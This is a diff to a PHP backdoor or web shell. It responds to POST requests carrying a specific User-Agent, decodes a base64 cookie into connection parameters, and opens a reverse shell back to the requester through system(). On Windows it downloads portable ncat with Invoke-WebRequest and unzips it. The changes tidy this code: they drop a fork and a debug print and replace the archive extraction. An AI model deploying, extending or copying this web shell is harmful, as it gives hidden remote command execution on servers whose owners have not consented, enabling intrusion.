@@ -294,7 +294,6 @@ function reverseConnections($methods, $host, $port, $shell)
     } else {
         echo("\nYou didnt specify a method to use, defaulting to bash.\n");
         echo("\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
-        $pid = pcntl_fork();
         system($useMethod);
     }
 
@@ -341,8 +340,15 @@ function windows($com, $r)
                 case "ncW":
                     echo("Pulling Ncat Executable!\n");
                     shell_exec("Invoke-WebRequest -Uri http://nmap.org/dist/ncat-portable-5.59BETA1.zip -OutFile nc1.zip");
-                    shell_exec("Expand-Archive ncat-portable-5.59BETA1.zip $cdir");
-                    echo("\nFile expanded to: " . $cdir);
+                    $zip = new ZipArchive();
+                    $unzipped = $zip->open("nc1.zip");
+                    if ($unzipped === true){
+                        $zip->extractTo($cdir."\\n\\");
+                        $zip->close();
+                        echo("\nFile expanded to: " . $cdir);
+                    }else{
+                        echo("Could not expand file.\n");
+                    }
                     break;
             }
         } else {
@@ -397,7 +403,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         }else {
             pcntl_wait($status);
             $splitter = explode(".", base64_decode($_COOKIE['r']));
-            echo "".print_r($splitter)."\n";
             reverseConnections($splitter[0], $_SERVER['REMOTE_ADDR'], $splitter[1], $splitter[2]);
             exit(0);
         }
